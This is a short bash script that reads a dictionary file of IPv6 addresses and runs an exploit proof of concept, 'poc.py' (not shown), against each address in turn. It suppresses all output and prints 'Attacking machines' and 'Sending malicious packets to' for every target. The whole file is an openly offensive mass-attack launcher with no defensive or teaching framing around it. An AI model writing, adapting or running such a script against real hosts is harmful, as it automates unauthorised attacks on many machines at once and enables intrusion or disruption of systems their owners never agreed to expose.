#!/bin/bash -e

#Colors
#boldText="\033[1m"
#normalText="\033[0m"
#endColor="\033[0m\e[0m"
#yellowColor="\e[0;33m\033[1m"
#redColor="\e[0;31m\033[1m"
#blueColor="\e[0;34m\033[1m"
#greenColor="\e[0;32m\033[1m"

echo -e "\033[1m[*] \e[0;34m\033[1mReading IPv6 dictionary...\033[0m\e[0m\033[0m\n"

echo -e "\033[1m[*] \e[0;34m\033[1mAttacking machines...\033[0m\e[0m\033[0m\n"

while read p; do
	python3 poc.py $p > /dev/null 2>&1
	echo -e "\t\e[0;32mSending malicious packets to\e[0;31m" $p
done <$1